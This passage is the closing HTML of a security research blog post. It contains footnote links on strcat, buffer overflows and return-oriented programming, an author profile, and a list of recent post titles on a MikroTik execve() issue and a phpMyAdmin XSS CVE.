      <p><a href="https://man7.org/linux/man-pages/man3/strcat.3.html">strcat</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:5" role="doc-endnote">
      <p><a href="https://ko.wikipedia.org/wiki/%EB%B2%84%ED%8D%BC_%EC%98%A4%EB%B2%84%ED%94%8C%EB%A1%9C">Buffer overflow</a> <a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:6" role="doc-endnote">
      <p><a href="[https://ko.wikipedia.org/wiki/%EB%B0%98%ED%99%98_%EC%A7%80%ED%96%A5%ED%98%95_%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D](https://ko.wikipedia.org/wiki/반환_지향형_프로그래밍)">Return oriented programming</a> <a href="#fnref:6" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/posts/thumbnails/20200619.jpg" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">김도현</div>
                <div class="page-profile-email">dhkim@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/posts/thumbnails/20200619.jpg" class="profile_image" />
            <div class="profile_author">김도현</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2021-10-13/MikroTik-PostAuth-RCE">
            <div class="post-title">
                MikroTik Post-Auth execve() call.
            </div>
        </a>
        <div class="post-summary">MikroTik Post-Auth execve() call.</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                김도현
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Oct 13, 2021
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/2021-08-20-CVE-2020-26934/profile.png" class="profile_image" />
            <div class="profile_author">고기완</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2021-09-02/CVE-2020-26934-phpMyAdmin-Reflected-Cross-site-scripting">
            <div class="post-title">
                CVE-2020-26934 - phpMyAdmin Reflected Cross-site scripting
            </div>
        </a>
        <div class="post-summary">phpMyAdmin Reflected Cross-site scripting</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                고기완
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Sep 2, 2021
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>